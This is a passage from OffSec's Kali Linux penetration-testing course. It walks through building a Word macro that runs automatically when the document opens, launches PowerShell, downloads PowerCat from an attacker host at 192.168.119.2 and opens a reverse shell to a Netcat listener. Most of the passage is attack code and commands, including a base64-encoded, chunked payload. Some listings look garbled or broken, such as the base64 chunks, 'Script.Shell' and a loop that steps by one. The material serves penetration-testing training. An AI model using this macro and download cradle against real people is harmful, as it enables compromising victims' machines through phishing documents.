
# OffSec

Penetration Testing with Kali Linux

Our updated VBA code is shown below:

```
Sub AutoOpen()
MyMacro
End Sub

Sub Document_Open()
MyMacro
End Sub

Sub MyMacro()
CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

Listing 214 - Macro automatically executing powershell exe after opening the Document

Next, we will click on the Save icon in the Microsoft Visual Basic for Applications window and close the document. After we reopen, we are presented with a security warning indicating that macros have been disabled. To run our macros, we will click on Enable Content.

![](img/336d6ea891e7464f18ad64426619ced4_334_0.png)

Figure 186: Microsoft Word Macro Security Warning

After we click on Enable Content a PowerShell window appears.

![](img/336d6ea891e7464f18ad64426619ced4_334_1.png)

Figure 187: Enabled macro started a PowerShell window

As Figure 187 shows, the PowerShell window was started through our macro. Very nice!

In a real-world assessment, our victim must click on Enable Content to run our macros, or our attack will fail. In enterprise environments, we can also face a situation where macros are disabled for Office documents in general. Fortunately, for us, macros are commonly used (and allowed) in most enterprises.

Let's wrap this section by extending the code execution of our current macro to a reverse shell with the help of PowerCat.⁵⁰⁹ We'll use a base64-encoded PowerShell download cradle¹⁰ to download PowerCat and start the reverse shell. The encoded PowerShell command will be declared as a string in VBA.

We should note that VBA has a 255-character limit for literal strings, and we can't just embed strings stored in variables, so we can split them into multiple lines (stored in strings) and concatenate them.

To do this, we will click on the Macros element in the View tab, select MyMacro in the list and click on Edit to get the macro editor. Next, we'll declare a variable name Str with the Dim¹¹ keyword, which we'll use to store our PowerShell download cradle and the command to create a reverse shell with PowerCat. The following listing shows the declaration of the variable and the modified line to run the command as a string in the variable.

```
Sub AutoOpen()
  MyMacro
End Sub
```

```
Sub Document_Open()
  MyMacro
End Sub
```

```
Sub MyMacro()
  Dim Str As String
  CreateObject("Wscript.Shell").Run Str
End Sub
```

Listing 215 - Declaring a string variable and provide it as a parameter

Next, we'll employ a PowerShell command to download PowerCat and use base64 to avoid issues with special characters as we've dealt with previous Modules. The following listing shows the PowerShell command before base64-encoding.

> To base64-encoded our command, we can use pwsh on Kali as we did in the Common Web Application Attacks Module.

```
IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c
192.168.119.2 -p 4444 -e powershell
```

Listing 216 - PowerShell download cradle and PowerCat reverse shell

⁵⁰⁹ (Github, 2020), https://github.com/besmith/powercat
¹⁰ (Github, 2017), https://github.com/Harm/J0y/bb48307ffa6325e269
¹¹ (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/dotnet/visual-language/reference/statements/dim

We can use the following Python script to split the base64-encoded string into smaller chunks of 50 characters and concatenate them into Str variable. To do this, we store the PowerShell command in a variable str and number of characters in a n. We must make that the base64-encoded command does not contain any line breaks before we paste it into the script. A for-loop iterates over the PowerShell command and prints each in the correct format for our macro.

```
str = "powershell.exe -nop -w hidden -e SQBFAGAKABOAGUw..."
n = 50
for i in range(0, len(str)):
    print("Str = Str + \"" + str[i:i+n] + \"")
```

Listing 217 - Python script to split a base64 encoded PowerShell command string

Having split the base64-encoded string into smaller chunks, we update our macro:

```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
```

```
Str = Str + "powershell.exe -nop -w hidden -e SQBFAGAKABOAGU"
Str = Str + "AdwataAEAY8gBQQUAYwB0ACAUwB5AHADABLAG0ALgBOGUAD"
Str = Str + "AAuFaCa2QB1AEbAbBpBQQUAGbB0GAClBEGA8AdwBuAgAbwb"
```

> Str = Str + "QJCAQAMASADJCAAYXADYoAAAUADEAMQ4ACAC4MgAgAc0CAAA"
Str = Str + "GDQANNAAA0ADIAATATAGUIAIwBg8AdwBLAHIAcWBOAGUAbSBS"

```
CreateObject("Script.Shell").Run Str
End Sub
```

Listing 218 - Invoking PowerShell to create a reverse shell

After we modify our macro, we can save and close the document. Before re-opening it, let's start a Python3 web server in the directory where the PowerCat script is located. We will also start a Netcat listener on port 4444.

After double-clicking the document, the macro is automatically executed. Note that the macro is executed, we receive a Netcat listener.

```
kali@kali: $ nc -nvlp 4444
```

Listing 219 - Reverse shell from macro
